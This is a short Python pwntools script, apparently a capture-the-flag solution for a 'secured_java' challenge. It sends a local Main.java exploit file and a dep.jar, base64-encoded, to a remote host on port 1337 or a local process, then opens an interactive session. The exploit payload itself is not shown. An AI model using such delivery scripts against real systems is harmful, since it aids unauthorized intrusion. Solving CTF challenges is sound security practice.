#!/usr/bin/env python3
from pwn import *
from base64 import b64encode

exploit = open('./Main.java', 'rb').read()
deps = open('./dep.jar', 'rb').read()

if args.REMOTE:
    p = remote('139.224.248.65', 1337)
else:
    p = process("./secured_java.py")

p.recvuntil(b'Content: (base64 encoded)')
p.sendline(b64encode(exploit))

p.recvuntil(b'Content: (base64 encoded)')
p.sendline(b64encode(deps))

p.interactive()
